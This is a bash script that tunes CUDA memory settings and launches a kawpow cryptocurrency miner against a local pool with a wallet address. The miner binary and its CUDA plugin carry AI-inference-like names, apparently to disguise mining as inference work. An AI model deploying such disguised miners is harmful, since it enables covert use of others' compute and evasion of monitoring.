#!/bin/bash
# 🔧 GPU Memory Optimization Script
# Fix memory allocation errors trong GPU mining

echo "🔧 [GPU-MEMORY-FIX] Starting GPU mining memory optimization..."

# 1. Environment Cleanup
echo "🧹 [CLEANUP] Killing existing GPU processes..."
pkill -f inference-cuda 2>/dev/null
sleep 3

# 2. CUDA Memory Management
echo "💾 [CUDA-MEMORY] Setting CUDA memory optimization..."
export CUDA_MALLOC_HEAP_SIZE=256M
export CUDA_MEMORY_POOL_SIZE=1024M
export CUDA_FORCE_PTX_JIT=0
export CUDA_CACHE_DISABLE=1

# 3. Process Isolation
echo "🔒 [ISOLATION] Configuring process isolation..."
export CUDA_VISIBLE_DEVICES=0
export CUDA_DEVICE_MAX_CONNECTIONS=1

# 4. Memory Limits
echo "📊 [LIMITS] Setting memory limits..."
ulimit -v 8388608  # 8GB virtual memory limit
ulimit -m 4194304  # 4GB physical memory limit

# 5. GPU Status Check
echo "🔍 [GPU-CHECK] Checking GPU status..."
nvidia-smi --query-gpu=name,memory.used,memory.free --format=csv,noheader,nounits

# 6. Launch Optimized GPU Mining
echo "🚀 [LAUNCH] Starting optimized GPU mining..."
echo "⚡ [CONFIG] Using single GPU with reduced configuration"

/usr/local/bin/inference-cuda \
  -o 127.0.0.1:4444 \
  -u RJPySG2zo7dG7oah9i7zseZRvMLaAUkzkx \
  --tls \
  --cuda \
  --cuda-loader=/usr/local/bin/libmlls-cuda.so \
  -a kawpow

echo "✅ [COMPLETE] GPU mining optimization script finished"